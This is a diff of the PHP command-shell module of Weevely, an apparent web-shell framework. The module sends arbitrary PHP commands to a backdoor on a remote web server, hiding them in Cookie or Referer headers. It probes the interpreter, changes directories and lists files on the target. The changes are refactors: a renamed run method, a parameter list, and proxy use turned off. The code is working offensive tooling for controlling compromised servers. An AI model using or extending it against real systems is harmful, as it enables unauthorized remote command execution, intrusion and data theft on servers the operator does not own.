@@ -6,14 +6,21 @@ Created on 22/ago/2011
 
 from core.module import Module, ModuleException
 from core.http.cmdrequest import CmdRequest, NoDataException
+from core.parameters import ParametersList, Parameter as P
+
 import random, os
 
 classname = 'Php'
+    
     
 class Php(Module):
     '''Shell to execute PHP commands
     :shell.php "<command>;"
     '''
+    
+    params = ParametersList('PHP command shell', [],
+                             P(arg='cmd', help='PHP commands (end with semi-comma)', required=True, pos=0),
+                        )
     
     available_modes = [ 'Cookie', 'Referer' ]
     
@@ -36,10 +43,11 @@ class Php(Module):
         
         proxy = modhandler.conf.get_option('global', 'http_proxy')
         if proxy:
-            self.mprint('[shell.php] Proxy cache can broke weevely requests, use proxychains instead.')
-            self.proxy = { 'http' : proxy }
+            self.mprint('[shell.php] Proxies cache can break requests. Use proxychains.')
+            #self.proxy = { 'http' : proxy }
 
         self.mprint('[shell.php] Loaded using \'%s\' encapsulation' % self.current_mode)
+        
         
 
     def _probe(self):
@@ -50,20 +58,21 @@ class Php(Module):
             rand = str(random.randint( 11111, 99999 ))
             self.current_mode = currentmode
             
-            if self.run('echo %s;' % (rand)) == rand:
+            if self.run_module('echo %s;' % (rand)) == rand:
                 found = True
                 break
         
         if not found:
             raise ModuleException(self.name,  "PHP interpreter initialization failed")
         else:
-            if self.run('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
+            if self.run_module('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
                 self.mprint('[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.')
             else:
                 self.cwd_vector = "chdir('%s') && %s" 
                 
        
-    def run(self, cmd, use_current_path = True, post_data = {}):
+    def run_module(self, cmd, use_current_path=True, post_data={}):
+
 
         if use_current_path and self.cwd_vector and self.path:
             cmd = self.cwd_vector % (self.path, cmd)
@@ -73,9 +82,9 @@ class Php(Module):
         if post_data:
             request.setPostData(post_data)
         
-        debug_level = 5
-        
+        debug_level = 3
         self.mprint( "Request: %s" % (cmd), debug_level)
+        
         
         try:
             resp = request.execute()
@@ -95,7 +104,7 @@ class Php(Module):
 
     def cwd_handler (self, path):
         
-        response = self.run("is_dir('%s') && print(1);" % path, False)
+        response = self.run_module("is_dir('%s') && print(1);" % path, False)
         if response == '1':
             self.path = path
             return True
@@ -115,7 +124,7 @@ class Php(Module):
             path = '.'
             
             
-        response = self.run( ls_vector % (path), False)
+        response = self.run_module( ls_vector % (path), False)
         if not response:
             self.mprint('[!] Error listing files in \'%s\', incorrect permission or safe mode enabled' % path)
             
